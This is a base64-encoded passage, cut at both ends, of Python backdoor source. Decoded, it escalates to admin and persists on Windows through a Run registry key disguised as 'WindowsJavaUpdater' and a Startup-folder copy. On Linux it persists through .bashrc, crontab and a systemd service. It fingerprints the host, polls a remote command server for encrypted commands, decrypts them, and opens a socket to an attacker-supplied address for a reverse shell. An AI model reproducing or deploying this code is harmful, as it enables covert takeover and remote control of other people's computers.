y53aW5kbGwuc2hlbGwzMi5TaGVsbEV4ZWN1dGVXKE5vbmUsICJydW5hcyIsIHN5cy5leGVjdXRhYmxlLCAiICIuam9pbihzeXMuYXJndiksIE5vbmUsIDEpCgogICAgICAgICAgICBpZiByZXMgPiAzMjoKICAgICAgICAgICAgICAgIHByaW50KCJhZG1pbiBvYnRhaW5lZCAtIGxhdW5jaGluZyBzdGFydHVwIikKICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHByaW50KCJhZG1pbiBzdGlsbCBub3Qgb2J0YWluZWQgLSB1c2luZyBvdGhlciBtZXRob2QiKQogICAgICAgICAgICAgICAgcHJpbnQoIkFkbWluIERlbmllZCIpCgogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KCJBZG1pbiBhbHJlYWR5IG9idGFpbmVkIC0gbGF1bmNoaW5nIHN0YXJ0dXAiKQoKICAgICAgICAKCiAgICAgICAgdHJ5OgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByZWdpc3RyeV9rZXkgPSB3aW5yZWcuT3BlbktleSh3aW5yZWcuSEtFWV9MT0NBTF9NQUNISU5FLCByIlNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbFxXaW5kb3dzSmF2YVVwZGF0ZXIiKQogICAgICAgICAgICAgICAgcHJpbnQoIlJlZ2lzdHJ5IGtleSAnV2luZG93c0phdmFVcGRhdGVyJyBleGlzdHMuIikKICAgICAgICAgICAgICAgIHdpbnJlZy5DbG9zZUtleShyZWdpc3RyeV9rZXkpCiAgICAgICAgICAgICAgICBwYXNzCgogICAgICAgICAgICAKICAgICAgICAgICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOgogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBwcmludCgiUmVnaXN0cnkga2V5ICdXaW5kb3dzSmF2YVVwZGF0ZXInIGRvZXMgbm90IGV4aXN0IC0gY3JlYXRpbmciKQogICAgICAgICAgICAgICAgdmFsdWVfbmFtZSA9ICJXaW5kb3dzSmF2YVVwZGF0ZXIiIAogICAgICAgICAgICAgICAgZmlsZV9wYXRoID0gc2NyaXB0X2RpcmVjdG9yeV9maWxlbmFtZSAgCiAgICAgICAgICAgICAgICBrZXlfcGF0aCA9IHIiU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIiAKICAgICAgICAgICAgICAgIHdpdGggd2lucmVnLk9wZW5LZXkod2lucmVnLkhLRVlfTE9DQUxfTUFDSElORSwga2V5X3BhdGgsIDAsIHdpbnJlZy5LRVlfU0VUX1ZBTFVFKSBhcyBrZXk6CiAgICAgICAgICAgICAgICAgICAgd2lucmVnLlNldFZhbHVlRXgoa2V5LCB2YWx1ZV9uYW1lLCAwLCB3aW5yZWcuUkVHX1NaLCBmaWxlX3BhdGgpCgogICAgICAgICAgICAgICAgcHJpbnQoZiJBZGRlZCB7dmFsdWVfbmFtZX0gdG8gc3RhcnR1cCByZWdpc3RyeSB3aXRoIGZpbGUgcGF0aDoge2ZpbGVfcGF0aH0iKQoKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIEU6CiAgICAgICAgICAgIHByaW50KCJFcnJvciBpbiByZWc6ICIsRSkKICAgICAgICAgICAgdGltZS5zbGVlcCgxMCkKICAgICAgICAgICAgcGFzcwoKICAKICAgIGRlZiBzdGFydHVwX2ZvbGRlcigpOgogICAgICAgIAogICAgICAgIHNjcmlwdF9wYXRoID0gc3lzLmFyZ3ZbMF0KICAgICAgICBpZiBnZXRhdHRyKHN5cywgJ2Zyb3plbicsIEZhbHNlKToKICAgICAgICAgICAgc2NyaXB0X3BhdGggPSBvcy5wYXRoLmFic3BhdGgob3MucGF0aC5qb2luKHN5cy5fTUVJUEFTUywgc3lzLmFyZ3ZbMF0pKQogICAgICAgIGZleHQgPSBvcy5wYXRoLnNwbGl0ZXh0KHNjcmlwdF9wYXRoKVsxXQogICAgICAgIAogICAgICAgIHN0YXJ0dXBfZm9sZGVyID0gb3MucGF0aC5qb2luKG9zLmdldGVudignQVBQREFUQScpLCAnTWljcm9zb2Z0JywgJ1dpbmRvd3MnLCAnU3RhcnQgTWVudScsICdQcm9ncmFtcycsICdTdGFydHVwJykKCiAgICAgICAgc2VwID0gb3MucGF0aC5zZXAKICAgICAgICBzY3JpcHRfcGF0aCA9IG9zLnBhdGguYWJzcGF0aChzeXMuYXJndlswXSkKCiAgICAgICAgaWYgZ2V0YXR0cihzeXMsICdmcm96ZW4nLCBGYWxzZSk6CiAgICAgICAgICAgIHNjcmlwdF9wYXRoID0gb3MucGF0aC5hYnNwYXRoKHN5cy5leGVjdXRhYmxlKQoKICAgICAgICBzY3JpcHRfZGlyZWN0b3J5ID0gb3MucGF0aC5kaXJuYW1lKHNjcmlwdF9wYXRoKQogICAgICAgIHNjcmlwdF9maWxlbmFtZSA9IG9zLnBhdGguYmFzZW5hbWUoc2NyaXB0X3BhdGgpCiAgICAgICAgc2NyaXB0X2RpcmVjdG9yeV9maWxlbmFtZSA9IHNjcmlwdF9kaXJlY3RvcnkgKyBzZXAgKyBzY3JpcHRfZmlsZW5hbWUKICAgICAgICBwcmludChzY3JpcHRfZGlyZWN0b3J5X2ZpbGVuYW1lKQoKICAgICAgICB0cnk6CiAgICAgICAgICAgIHNodXRpbC5jb3B5KHNjcmlwdF9kaXJlY3RvcnlfZmlsZW5hbWUsIHN0YXJ0dXBfZm9sZGVyKQogICAgICAgICAgICBwcmludChmJ1N1Y2Nlc3NmdWxseSBjb3BpZWQge3NjcmlwdF9kaXJlY3RvcnlfZmlsZW5hbWV9IHRvIHRoZSBzdGFydHVwIGZvbGRlci4nKQoKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHByaW50KGYnRXJyb3I6IHtlfScpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMTApCiAgICAgICAgICAgIHBhc3MKCiAgICAgICAgc3RhcnR1cF9mID0gb3MucGF0aC5qb2luKG9zLmdldGVudignQVBQREFUQScpLCAnTWljcm9zb2Z0JywgJ1dpbmRvd3MnLCAnU3RhcnQgTWVudScsICdQcm9ncmFtcycsICdTdGFydHVwJykKICAgICAgICBzdGFydHVwX3NjcmlwdF9wYXRoID0gc3RhcnR1cF9mICsgc2VwICsgc2NyaXB0X2ZpbGVuYW1lCiAgICAgICAgcHJpbnQoZiJTY3JpcHQgcGF0aDoge3NjcmlwdF9kaXJlY3RvcnlfZmlsZW5hbWV9IikKICAgICAgICBwcmludChmIlN0YXJ0dXAgZm9sZGVyIHBhdGg6IHtzdGFydHVwX3NjcmlwdF9wYXRofSIpCgogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKHN0YXJ0dXBfc2NyaXB0X3BhdGgpOgogICAgICAgICAgICBwcmludChmIlRoZSBzY3JpcHQgaXMgYWxyZWFkeSBpbiB0aGUgU3RhcnR1cCBmb2xkZXI6IHtzdGFydHVwX3NjcmlwdF9wYXRofSIpCiAgICAgICAgICAgIHBhc3MKICAgICAgICAKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludChmInNjcmlwdCBpcyBOT1QgaW4gdGhlIFN0YXJ0dXAgZm9sZGVyLiBhZGRpbmcuLi4iKQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgY3R5cGVzLndpbmRsbC5zaGVsbDMyLklzVXNlckFuQWRtaW4oKSAhPSAxOgogICAgICAgICAgICAgICAgcHJpbnQoIm5vdCBhZG1pbiIpCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDIpCiAgICAgICAgICAgICAgICBwcmludCgiYXR0ZW1wdGluZyB0byBvYnRhaW4gYWRtaW4iKQoKICAgICAgICAgICAgICAgIHJlcyA9IGN0eXBlcy53aW5kbGwuc2hlbGwzMi5TaGVsbEV4ZWN1dGVXKE5vbmUsICJydW5hcyIsIHN5cy5leGVjdXRhYmxlLCAiICIuam9pbihzeXMuYXJndiksIE5vbmUsIDEpCgogICAgICAgICAgICAgICAgaWYgcmVzID4gMzI6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoImFkbWluIG9idGFpbmVkIC0gbGF1bmNoaW5nIHN0YXJ0dXAiKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludCgiYWRtaW4gc3RpbGwgbm90IG9idGFpbmVkIC0gdXNpbmcgb3RoZXIgbWV0aG9kIikKICAgICAgICAgICAgICAgICAgICBwYXNzCgogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcHJpbnQoIkFkbWluIGFscmVhZHkgb2J0YWluZWQgLSBsYXVuY2hpbmcgc3RhcnR1cCIpCgoKICAgIHRyeToKICAgICAgICAKICAgICAgICBzdGFydHVwX2ZvbGRlcigpCiAgICAgICAgcHJpbnQoIlN0YXJ0dXAgZm9sZGVyIHN1Y2Nlc3NmdWwgLSAiKQogICAgICAgIAogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBFOgogICAgICAgIAogICAgICAgIHByaW50KCJFcnJvciBpbiBmb2xkZXIgc3RhcnR1cDogIixFKQogICAgICAgIHRpbWUuc2xlZXAoNSkKICAgICAgICBwcmludCgiQXR0ZW1wdGluZyBSZWcgYmFja2Rvb3IuLi4iKQogICAgICAgIHRpbWUuc2xlZXAoNSkKICAgICAgICByZWdfa2V5KCkKICAgICAgICBwYXNzCgppZiBvcGVyYXRpbmdfc3lzdGVtID09ICdMaW51eCcgb3Igb3BlcmF0aW5nX3N5c3RlbSA9PSAnTGludXgyJzoKCiAgICB0cnk6CgogICAgICAgIHByaW50KCJzdGFydGluZyBsaW51eCBwZXJzaXN0IikKCiAgICAgICAgc2NyaXB0X3BhdGggPSBvcy5wYXRoLmFic3BhdGgoc3lzLmFyZ3ZbMF0pCiAgICAgICAgc3RhcnR1cF9wYXRoID0gb3MucGF0aC5leHBhbmR1c2VyKCJ+Ly5jb25maWcvc3RhcnR1cF9zY3JpcHRfYmFzaHJjLnB5IikKCiAgICAgICAgc2h1dGlsLmNvcHkoc2NyaXB0X3BhdGgsIHN0YXJ0dXBfcGF0aCkKICAgICAgICBvcy5jaG1vZChzdGFydHVwX3BhdGgsIDBvNzU1KQoKICAgICAgICB3aXRoIG9wZW4ob3MucGF0aC5leHBhbmR1c2VyKCJ+Ly5iYXNocmMiKSwgImEiKSBhcyBiYXNocmM6CiAgICAgICAgICAgIGJhc2hyYy53cml0ZShmIlxuIyBBZGQgdG8gc3RhcnR1cFxue3N0YXJ0dXBfcGF0aH0gJlxuIikKCgogICAgICAgIHNjcmlwdF9wYXRoID0gb3MucGF0aC5hYnNwYXRoKHN5cy5hcmd2WzBdKQogICAgICAgIHN0YXJ0dXBfcGF0aCA9IG9zLnBhdGguZXhwYW5kdXNlcigifi8uY29uZmlnL3N0YXJ0dXBfc2NyaXB0X2Nyb250YWIucHkiKQoKICAgICAgICBzaHV0aWwuY29weShzY3JpcHRfcGF0aCwgc3RhcnR1cF9wYXRoKQogICAgICAgIG9zLmNobW9kKHN0YXJ0dXBfcGF0aCwgMG83NTUpCgogICAgICAgIG9zLnN5c3RlbShmJyhjcm9udGFiIC1sIDsgZWNobyAiQHJlYm9vdCB7c3RhcnR1cF9wYXRofSIpIHwgY3JvbnRhYiAtJykKCgogICAgICAgIHNjcmlwdF9wYXRoID0gb3MucGF0aC5hYnNwYXRoKHN5cy5hcmd2WzBdKQogICAgICAgIHN0YXJ0dXBfcGF0aCA9IG9zLnBhdGguZXhwYW5kdXNlcigifi8uY29uZmlnL3N0YXJ0dXBfc2NyaXB0X3N5c3RlbWQucHkiKQoKICAgICAgICBzaHV0aWwuY29weShzY3JpcHRfcGF0aCwgc3RhcnR1cF9wYXRoKQogICAgICAgIG9zLmNobW9kKHN0YXJ0dXBfcGF0aCwgMG83NTUpCgogICAgICAgIHN5c3RlbWRfc2VydmljZSA9IGYiIiJbVW5pdF0KICAgIERlc2NyaXB0aW9uPU15IFN0YXJ0dXAgU2NyaXB0CgogICAgW1NlcnZpY2VdCiAgICBUeXBlPXNpbXBsZQogICAgRXhlY1N0YXJ0PXtzdGFydHVwX3BhdGh9CgogICAgW0luc3RhbGxdCiAgICBXYW50ZWRCeT1kZWZhdWx0LnRhcmdldAogICAgIiIiCgogICAgICAgIHN5c3RlbWRfc2VydmljZV9wYXRoID0gIi9ldGMvc3lzdGVtZC9zeXN0ZW0vc3RhcnR1cF9zY3JpcHRfc3lzdGVtZC5zZXJ2aWNlIgogICAgICAgIHdpdGggb3BlbihzeXN0ZW1kX3NlcnZpY2VfcGF0aCwgInciKSBhcyBzZXJ2aWNlX2ZpbGU6CiAgICAgICAgICAgIHNlcnZpY2VfZmlsZS53cml0ZShzeXN0ZW1kX3NlcnZpY2UpCgogICAgICAgICNlbmFibGUgYW5kIHN0YXJ0IHRoZSBzZXJ2aWNlCiAgICAgICAgCiAgICAgICAgb3Muc3lzdGVtKGYic3lzdGVtY3RsIGVuYWJsZSBzdGFydHVwX3NjcmlwdF9zeXN0ZW1kLnNlcnZpY2UiKQogICAgICAgIG9zLnN5c3RlbShmInN5c3RlbWN0bCBzdGFydCBzdGFydHVwX3NjcmlwdF9zeXN0ZW1kLnNlcnZpY2UiKQoKICAgICAgICB0aW1lLnNsZWVwKDIpCgogICAgICAgICN0cnkgYWdhaW4gaW5jYXNlIG9mIGluaXRpYWwgcHJpdmlsYWdlIGVycm9ycyBvciBzbG93IHN0YXJ0CgogICAgICAgIG9zLnN5c3RlbSgic3VkbyBzeXN0ZW1jdGwgZGFlbW9uLXJlbG9hZCIpCiAgICAgICAgb3Muc3lzdGVtKCJzdWRvIHN5c3RlbWN0bCBlbmFibGUgc3RhcnR1cF9zY3JpcHRfc3lzdGVtZC5zZXJ2aWNlIikKICAgICAgICBvcy5zeXN0ZW0oInN1ZG8gc3lzdGVtY3RsIHN0YXJ0IHN0YXJ0dXBfc2NyaXB0X3N5c3RlbWQuc2VydmljZSIpCiAgICAgICAgCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIEU6CiAgICAgICAgcHJpbnQoIkVycm9yIGluIHBlcnNpc3RhbmNlOiAiLEUpCiAgICAgICAgcGFzcwoKICAgICMgUGFydCBvZiBzY3JpcHQgb25seSB3b3JrcyBvbmNlIGNvbXBsaWVkIGludG8gZXhlY3V0YWJsZSBmb3JtYXQgCgoKICAgIApwcm9jZXNzb3JfaW5mbyA9IHBsYXRmb3JtLnByb2Nlc3NvcigpO3N5c3RlbV9pbmZvID0gcGxhdGZvcm0uc3lzdGVtKCk7cmVsZWFzZV9pbmZvID0gcGxhdGZvcm0ucmVsZWFzZSgpO2NvbmNhdGVuYXRlZF9pbmZvID0gZiJ7cHJvY2Vzc29yX2luZm99LXtzeXN0ZW1faW5mb30te3JlbGVhc2VfaW5mb30iCnVuaXF1ZV9maW5nZXJwcmludCA9IGhhc2hsaWIuc2hhMjU2KGNvbmNhdGVuYXRlZF9pbmZvLmVuY29kZSgpKS5oZXhkaWdlc3QoKVs6OF0KCmN1cnJlbnRfZGF0ZXRpbWUgPSBkYXRldGltZS5ub3coKQpmb3JtYXR0ZWRfZGF0ZXRpbWUgPSBjdXJyZW50X2RhdGV0aW1lLnN0cmZ0aW1lKCIlZHRoICVCICVJOiVNICVwIikKCnVuYW1lID0gcGxhdGZvcm0udW5hbWUoKQpzeXN0ZW0gPSBwbGF0Zm9ybS5zeXN0ZW0oKQphcmNoID0gcGxhdGZvcm0uYXJjaGl0ZWN0dXJlKCkKaG9zdG5hbWUgPSBzb2NrZXQuZ2V0aG9zdG5hbWUoKQp2ZXJzaW9uID0gcGxhdGZvcm0udmVyc2lvbigpCmNwdWNvdW50ID0gb3MuY3B1X2NvdW50KCkKY3B1YnVpbGQgPSB1bmFtZS5tYWNoaW5lCgpwbCA9IHN5c3RlbSsiICIrdmVyc2lvbisiICIrIigiK2NwdWJ1aWxkKyIpIgoKc2wgPSBzdHIocGwpCnNsID0gc2wucmVwbGFjZSgiJyIsICIiKS5yZXBsYWNlKCIoIiwgIiIpLnJlcGxhY2UoIikiLCAiIikKcHJpbnQoc2wpCgpzZXAgPSBvcy5wYXRoLnNlcApvcyA9IHNsCgpzbGVlcCA9IE5vbmUKCmRlZiBzZCgpOgoKICAgICMgTmV0d29yayB0aHJvdHRsZSBhbmQgbG93ZXIgc3RyZXNzIG5ldHdvcmsgcmVxdWVzdHMgc2VudCBpbiAiY2h1bmtzIgoKICAgIGdsb2JhbCBzbGVlcAoKICAgIHdoaWxlIFRydWU6CiAgICAgICAgd2hpbGUgc2xlZXA6CiAgICAgICAgICAgIGJyZWFrCiAgICAgICAgZWxzZToKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDIpCiAgICAgICAgICAgICAgICB1cmwgPSBzZW5kdG91cmwgKyAic2VydmVyLnBocCIKICAgICAgICAgICAgICAgIGhlYWRlcnMgPSB7CiAgICAgICAgICAgICAgICAgICAgIlVzZXItQWdlbnQiOiBzbCsiLCBVbmlxdWUgSUQ6ICgiK3VuaXF1ZV9maW5nZXJwcmludCsiKSIsCiAgICAgICAgICAgICAgICAgICAgIlJlZmVyZXIiOiBzZW5kdG91cmwsCiAgICAgICAgICAgICAgICAgICAgIkFjY2VwdC1MYW5ndWFnZSI6ICJlbi1HQixlbi1VUztxPTAuOSxlbjtxPTAuOCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHdpdGggcmVxdWVzdHMuZ2V0KHVybCwgaGVhZGVycz1oZWFkZXJzLCBzdHJlYW09VHJ1ZSkgYXMgcmVzcG9uc2U6CiAgICAgICAgICAgICAgICAgICAgZm9yIGNodW5rIGluIHJlc3BvbnNlLml0ZXJfY29udGVudChjaHVua19zaXplPTEyOCk6CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGNodW5rOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlJlY2VpdmVkIGNodW5rOiIsIGNodW5rLmRlY29kZSgndXRmLTgnKSkKICAgICAgICAgICAgZXhjZXB0IHJlcXVlc3RzLlJlcXVlc3RFeGNlcHRpb246CiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAgICAgICAgICAgICBwYXNzCgpkZWYgbW4oKToKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBpbXBvcnQgb3M7dGltZS5zbGVlcCgxKQogICAgCiAgICAgICAgICAgIGRlZiBnZXRfbGluZXNfaW5fY2h1bmtzKHVybCwgY2h1bmtfc2l6ZSk6CiAgICAgICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwsIHN0cmVhbT1UcnVlKQogICAgICAgICAgICAgICAgbGluZXMgPSBbXQoKICAgICAgICAgICAgICAgIGZvciBjaHVuayBpbiByZXNwb25zZS5pdGVyX2NvbnRlbnQoY2h1bmtfc2l6ZT0xMjgpOgogICAgICAgICAgICAgICAgICAgIGlmIGNodW5rOgogICAgICAgICAgICAgICAgICAgICAgICBsaW5lcy5leHRlbmQoY2h1bmsuZGVjb2RlKCd1dGYtOCcpLnNwbGl0bGluZXMoKSkKCiAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlIGxlbihsaW5lcykgPj0gY2h1bmtfc2l6ZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHlpZWxkIGxpbmVzWzpjaHVua19zaXplXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGluZXMgPSBsaW5lc1tjaHVua19zaXplOl0KICAgICAgICAgICAgICAgIGlmIGxpbmVzOgogICAgICAgICAgICAgICAgICAgIHlpZWxkIGxpbmVzCgogICAgICAgICAgICB1cmwgPSBzZW5kdG91cmwgKyAicGljby13aWZpLnR4dCIKICAgICAgICAgICAgY2h1bmtfc2l6ZSA9IDEyCgogICAgICAgICAgICBmb3IgY2h1bmsgaW4gZ2V0X2xpbmVzX2luX2NodW5rcyh1cmwsIGNodW5rX3NpemUpOgogICAgICAgICAgICAgICAgZm9yIGxpbmUgaW4gY2h1bms6CgogICAgICAgICAgICAgICAgICAgIHByaW50KCJQcm9jZXNzZWQgbGluZToiLCBsaW5lKQoKICAgICAgICAgICAgICAgICAgICAjcmVjaWV2ZSBjb21tYW5kIGVuY3J5cGVkCgogICAgICAgICAgICAgICAgICAgIHRleHRfd2l0aF9xdW90ZXMgPSBzdHIobGluZSkKICAgICAgICAgICAgICAgICAgICBwYXR0ZXJuID0gciInKC4qPyknIgogICAgICAgICAgICAgICAgICAgIG1hdGNoZXMgPSByZS5maW5kYWxsKHBhdHRlcm4sIHRleHRfd2l0aF9xdW90ZXMpCiAgICAgICAgICAgICAgICAgICAgZm9yIG1hdGNoIGluIG1hdGNoZXM6CiAgICAgICAgICAgICAgICAgICAgICAgIGxpbmUgPSBtYXRjaAoKCiAgICAgICAgICAgICAgICAgICAgZW5jcnlwdGVkX3RleHQgPSBsaW5lCgogICAgICAgICAgICAgICAgICAgIGVuY3J5cHRlZF90ZXh0ID0gc3RyKGVuY3J5cHRlZF90ZXh0KQoKICAgIAogICAgICAgICAgICAgICAgICAgIHByaW50KCJFTkNSWVBURUQgQ09NTUFORDoiLGVuY3J5cHRlZF90ZXh0KQoKCiAgICAgICAgICAgICAgICAgICAgZGVjcnlwdGVkX3RleHQgPSAiIgogICAgICAgICAgICAgICAgICAgIGtleV9sZW5ndGggPSBsZW4oZGVjcnlwdGlvbl9rZXkpICNwcm9jZXNzIGRlY3J5cHRpb24gY3lwaGVyCgoKICAgICAgICAgICAgICAgICAgICAjZGVjcnlwdCBjb21tYW5kCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaSA9IDAKICAgICAgICAgICAgICAgICAgICBmb3IgY2hhciBpbiBlbmNyeXB0ZWRfdGV4dDoKICAgICAgICAgICAgICAgICAgICAgICAga2V5X2NoYXIgPSBkZWNyeXB0aW9uX2tleVtpICUga2V5X2xlbmd0aF0KICAgICAgICAgICAgICAgICAgICAgICAgaSArPSAxCgogICAgICAgICAgICAgICAgICAgICAgICBpZiBjaGFyLmlzYWxwaGEoKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlzX3VwcGVyID0gY2hhci5pc3VwcGVyKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNoYXJfc2hpZnQgPSBvcmQoY2hhcikgLSBvcmQoJ0EnKSBpZiBpc191cHBlciBlbHNlIG9yZChjaGFyKSAtIG9yZCgnYScpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBrZXlfc2hpZnQgPSBvcmQoa2V5X2NoYXIpIC0gb3JkKCdBJykgaWYga2V5X2NoYXIuaXN1cHBlcigpIGVsc2Ugb3JkKGtleV9jaGFyKSAtIG9yZCgnYScpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVjcnlwdGVkX2NoYXIgPSBjaHIoKChjaGFyX3NoaWZ0IC0ga2V5X3NoaWZ0KSAlIDI2KSArIG9yZCgnQScpIGlmIGlzX3VwcGVyIGVsc2UgKChjaGFyX3NoaWZ0IC0ga2V5X3NoaWZ0KSAlIDI2KSArIG9yZCgnYScpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVjcnlwdGVkX3RleHQgKz0gZGVjcnlwdGVkX2NoYXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBlbGlmIGNoYXIuaXNkaWdpdCgpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hhcl9zaGlmdCA9IGludChjaGFyKQogICAgICAgICAgICAgICAgICAgICAgICAgICAga2V5X3NoaWZ0ID0gaW50KGtleV9jaGFyLCAzNikKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZWNyeXB0ZWRfZGlnaXQgPSBzdHIoKGNoYXJfc2hpZnQgLSBrZXlfc2hpZnQpICUgMTApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZWNyeXB0ZWRfdGV4dCArPSBkZWNyeXB0ZWRfZGlnaXQKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRlY3J5cHRlZF90ZXh0ICs9IGNoYXIKCiAgICAgICAgICAgICAgICAgICAgbGluZSA9IGRlY3J5cHRlZF90ZXh0CgogICAgICAgICAgICAgICAgICAgIHByaW50KCJERUNSWVBURUQgQ09NTUFORDoiLGxpbmUpCgogICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IGxpbmU7c3RyaW5nID0gc3RyKHN0cmluZykKICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHJpbmcucmVwbGFjZSgiJyIsIiIpCiAgICAgICAgICAgICAgICAgICAgZmluZCA9IHN0cmluZwogICAgICAgICAgICAgICAgICAgIHJlcyA9IHJlLmZpbmRhbGwocidcKC4qP1wpJywgc3RyaW5nKQogICAgICAgICAgICAgICAgICAgIHN1bHQgPSBzdHIocmVzKTtzdHJpbmcgPSBzdWx0O3N0cmluZyA9IHN0cihzdHJpbmcpCiAgICAgICAgICAgICAgICAgICAgc3RyaW5nID0gc3RyaW5nLnJlcGxhY2UoIlsiLCAiIikucmVwbGFjZSgiXSIsICIiKS5yZXBsYWNlKCIpIiwgIiIpLnJlcGxhY2UoIigiLCAiIikucmVwbGFjZSgiJyIsICIiKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmICJpcCIgaW4gZmluZDoKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQgPSBzdHJpbmcKICAgICAgICAgICAgICAgICAgICAgICAgc2VudGlwID0gc3RyaW5nCgogICAgICAgICAgICAgICAgICAgICAgICBwcmludChzZW50aXApCgogICAgICAgICAgICAgICAgICAgICAgICBteWlwID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2FwaS5pcGlmeS5vcmciKS5jb250ZW50CiAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IG15aXAKICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nID0gc3RyKHN0cmluZykKICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nID0gc3RyaW5nLnJlcGxhY2UoImIiLCAiIikucmVwbGFjZSgiJyIsICIiKQogICAgICAgICAgICAgICAgICAgICAgICBteWlwID0gc3RyaW5nCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBwcmludChteWlwKQoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgc2VudGlwID09IG15aXA6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvcm1lID0gVHJ1ZQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGZpbmQpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJjID0gcmUuZmluZGFsbChyJ1xbLio/XF0nLCBmaW5kKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nID0gYnJjCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHIoc3RyaW5nKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nID0gc3RyaW5nLnJlcGxhY2UoIl0iLCAiIikucmVwbGFjZSgiWyIsICIiKS5yZXBsYWNlKCInIiwgIiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmNrID0gc3RyaW5nCgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICJTSEVMTC1FWFQtVENQIiBpbiBmaW5kOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGJyY2spCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgoKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlucHV0X3N0cmluZyA9IGJyY2sKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3BsaXRfc3RyaW5ncyA9IGlucHV0X3N0cmluZy5zcGxpdCgiOiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlwX2FkZHJlc3MgPSBzcGxpdF9zdHJpbmdzWzBdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBvcnRfbnVtYmVyID0gc3BsaXRfc3RyaW5nc1sxXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiSVAgQWRkcmVzczoiLCBpcF9hZGRyZXNzKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiUG9ydCBOdW1iZXI6IiwgcG9ydF9udW1iZXIpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZWYgc2hlbGwoKToKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzLmNvbm5lY3QoKHN0cihpcF9hZGRyZXNzKSwgaW50KHBvcnRfbnVtYmVyKSkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgI